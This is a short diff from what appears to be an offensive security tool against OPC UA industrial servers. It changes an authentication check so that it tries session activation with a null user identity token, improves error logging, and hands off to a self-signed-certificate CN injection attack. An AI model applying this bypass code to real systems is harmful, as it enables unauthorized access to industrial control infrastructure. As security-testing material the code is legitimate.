@@ -1147,7 +1147,7 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
         log(f'Server requires user authentication, which is not implemented for this attack. Will stop here.')
         return None
     except ServerError as err:
-      log(f'Login blocked. Server responsed with error {hex(err.errorcode)}.')
+      log(f'Login blocked. Server responsed with error {hex(err.errorcode)}: "{err.reason}"')
       return None      
         
   log(f'Trying to submit cert to endpoint {ep.endpointUrl}.')
@@ -1429,7 +1429,7 @@ def auth_check(url : str, skip_none : bool, demo : bool):
             clientSignature=signatureData.create(algorithm=None,signature=None),
             clientSoftwareCertificates=[],
             localeIds=[],
-            userIdentityToken=anonymousIdentityToken.create(policyId=anon_policies[0].policyId),
+            userIdentityToken=None,
             userTokenSignature=signatureData.create(algorithm=None,signature=None),
           )
           log_success('Session activation successful!')
@@ -1441,6 +1441,7 @@ def auth_check(url : str, skip_none : bool, demo : bool):
         except Exception as ex:
           log(f'Attempt failed due to Exception {type(ex).__name__}: "{ex}"')
   
-  log('Anonymous login didn\'t work. Trying self-signed certificate next.')
+    log('Anonymous login didn\'t work. Trying self-signed certificate next.')
+    
   inject_cn_attack(url, TEMPLATE_APP_URI, False, demo)
   
